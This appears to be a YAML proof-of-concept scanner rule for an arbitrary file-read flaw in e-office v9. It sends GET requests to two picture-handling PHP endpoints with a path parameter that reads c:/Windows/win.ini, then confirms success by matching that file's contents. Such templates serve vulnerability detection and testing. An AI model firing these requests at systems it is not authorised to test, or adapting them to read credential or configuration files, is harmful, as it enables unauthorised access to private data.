name: poc-yaml-eoffice-v9-fileread
binding: 9a5ef3aa-23eb-48fc-820c-a975d672026e
manual: true
detail:
    author: ct
    links:
        - https://www.yuque.com/docs/share/e615111d-56f9-410b-92a1-0b036232bdf7?# 密码:xy84
    vulnerability:
        id: CT-517512
        level: medium
transport: http
rules:
    r1:
        request:
            cache: true
            method: GET
            path: /general/picture/down.php?PIC_ID=1&PIC_PATH=c:/Windows&FILE_NAME=win.ini
        expression: response.status == 200 && response.body.bcontains(b"for 16-bit app support") && response.body.bcontains(b"[extensions]")
    r2:
        request:
            cache: true
            method: GET
            path: /general/picture/header.php?PIC_ID=1&PIC_PATH=c:/Windows&FILE_NAME=win.ini
        expression: response.status == 200 && response.body.bcontains(b"for 16-bit app support") && response.body.bcontains(b"[extensions]")
expression: r1() || r2()
